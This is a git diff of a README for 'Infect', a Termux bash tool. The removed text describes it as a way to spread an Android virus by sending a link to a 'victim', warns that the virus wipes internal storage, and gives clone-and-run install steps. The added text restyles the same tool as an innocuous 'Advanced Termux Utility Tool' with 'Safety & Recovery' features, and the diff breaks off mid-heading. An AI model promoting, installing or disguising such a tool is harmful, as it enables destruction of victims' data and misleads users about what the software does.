@@ -1,72 +1,56 @@
+╔═══════════════════════════════════════════╗
+       🕸️ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘: 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 🕸️
+╚═══════════════════════════════════════════╝
+          𝗣𝗥𝗢𝗝𝗘𝗖𝗧: 𝗜𝗡𝗙𝗘𝗖𝗧
+     𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗧𝗲𝗿𝗺𝘂𝘅 𝗨𝘁𝗶𝗹𝗶𝘁𝘆 𝗧𝗼𝗼𝗹
 
+╔═══════════════════════════════════════════╗
+        📜 𝗔𝗕𝗢𝗨𝗧 𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟
+╚═══════════════════════════════════════════╝
 
-## ABOUT TOOL :
+📱 𝗧𝗼𝗼𝗹 𝗧𝘆𝗽𝗲: Bash-based Termux Script
+⚡ 𝗦𝘁𝗮𝘁𝘂𝘀: Fully Functional
+🎯 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: Android (Termux)
+🔧 𝗖𝗼𝗺𝗽𝗮𝘁𝗶𝗯𝗶𝗹𝗶𝘁𝘆: Rooted & Non-Rooted Devices
 
-Infect is a bash based script which is officially made for termux users and from this tool you can spread android virus by just sending link. This tool works on both rooted Android device and Non-rooted Android device.
-Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Use.
-<p align="center"><a href="https://rebrand.ly/noobhacktube"><img title="Lucifer" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
-</p>
+══════════════════════════════════════════════
 
-## AVAILABLE ON :
+╔═══════════════════════════════════════════╗
+      ⚙️ 𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗔𝗟 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗠𝗘𝗡𝗧𝗦
+╚═══════════════════════════════════════════╝
 
-* Termux
+🌐 𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁: Stable Connection Required
+💾 𝗦𝘁𝗼𝗿𝗮𝗴𝗲: Minimum 400MB Free Space
+📦 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻: External Storage Access
+🧠 𝗥𝗔𝗠: Minimum 1GB Recommended
 
-### TESTED ON :
+══════════════════════════════════════════════
 
-* Termux
+╔═══════════════════════════════════════════╗
+      🌟 𝗞𝗘𝗬 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 & 𝗖𝗔𝗣𝗔𝗕𝗜𝗟𝗜𝗧𝗜𝗘𝗦
+╚═══════════════════════════════════════════╗
 
-### REQUIREMENTS :
-* internet
-* external storage permission
-* storage 400 MB
-* 1gb ram
+✅ 𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗦𝗰𝗿𝗶𝗽𝘁𝗶𝗻𝗴 𝗘𝗻𝗴𝗶𝗻𝗲
+   ├── Modular Code Architecture
+   ├── Error Handling System
+   └── Log Management
 
-## FEATURES :
-* [+] Dangerous virus tool !
-* [+] Updated maintainence !
-* [+] Easy for beginners !
-* [+] Working virus tool for termux !
+✅ 𝗖𝗿𝗼𝘀𝘀-𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝗖𝗼𝗺𝗽𝗮𝘁𝗶𝗯𝗶𝗹𝗶𝘁𝘆
+   ├── Rooted Device Support
+   └── Non-Rooted Device Support
 
-## INSTALLATION [Termux] :
+✅ 𝗨𝘀𝗲𝗿-𝗙𝗿𝗶𝗲𝗻𝗱𝗹𝘆 𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲
+   ├── Colorful Terminal Output
+   ├── Interactive Menu System
+   └── Progress Indicators
 
-* `apt-get update -y`
-* `apt-get upgrade -y`
-* `pkg install python -y`
-* `pkg install python2 -y`
-* `pkg install git -y`
-* `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
-* `cd $HOME`
-* `ls`
-* `cd infect`
-* `ls`
-* `bash infect.sh`
-```
-[+]-- Now you need internet connection to continue further process...
-[+]-- You can select any option by clicking on your keyboard
-[+]-- Note:- Don't delete any of the scripts included in lol directory (folder)
-```
-## USAGE OPTIONS [Termux] :
+✅ 𝗦𝗮𝗳𝗲𝘁𝘆 & 𝗥𝗲𝗰𝗼𝘃𝗲𝗿𝘆
+   ├── Backup Mechanisms
+   ├── Safe Mode Operations
+   └── System Integrity Checks
 
-__INFECT__ :
-- From this option you will get link of virus in your termux just send that link to your victim and let the fun happen.
+══════════════════════════════════════════════
 
-__SAVE__ :
-- From this option you can repair damaged device of your victm from that virus by just installing this anti-virus in his device.
-
-__UPDATE__ :
-- From this option you can update the infect script.
-
-__EXIT__ :
-- From this option you can exit from infect tool 
-
-## SCREEN SHOTS [Termux]
-
-<br>
-<p align="center">
-<img width="50%" src="https://user-images.githubusercontent.com/49580304/96560925-c32d5880-1273-11eb-99e6-f6c85fa00783.jpg"/>
-<img width="46%" src="https://user-images.githubusercontent.com/49580304/96560932-c4f71c00-1273-11eb-98d5-78210392ad54.jpg"/>
-</p>
-
-## WARNING : 
-***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
+╔═══════════════════════════════════════════╗
+     📥 𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗧𝗜𝗢𝗡 𝗣𝗥𝗢𝗖𝗘𝗗𝗨𝗥𝗘
+╚══════════════════════════════════════════
